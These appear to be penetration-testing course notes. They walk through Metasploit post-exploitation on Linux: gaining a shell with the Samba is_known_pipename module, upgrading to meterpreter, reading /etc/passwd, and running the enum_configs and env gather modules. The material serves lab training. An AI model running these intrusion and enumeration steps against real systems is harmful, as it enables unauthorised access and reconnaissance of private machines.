+ The MSF provides us with various post exploitation modules for both Windows and Linux.

+ We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
	+ Enumerate system configuration
	+ Enumerate environment variables
	+ Enumerate network configuration
	+ VM check
	+ Enumerate user history

### Basic post exploitation commands

1. Perform `db_nmap` scan.

2. Exploiting SAMBA to gain initial access
```
use exploit/linux/samba/is_known_pipename
```

3. We'll now upgrade the command shell session to a `meterpreter` session.
```
sessions -u 1
```

4. We can now use `getuid` command to check if our `uid` is 0. `uid=0` indicates that we've root access to the target system.

5. We can now check the list of users in the system.
```
cat /etc/passwd
```

6. We can check the distribution version and release.
```
cat /etc/*issue
```

7. Check the hostname, kernel version and other info using `uname -a`

8. We can `ifconfig` or `ip a s` command to check network details.

9. We can list out the processes running in the system using `ps aux` command.

### Linux post exploitation modules

1. Enumerate Linux configurations
```
use post/linux/gather/enum_configs
```

2. Enumerate the operating system environment settings.
```
use post/multi/gather/env
```
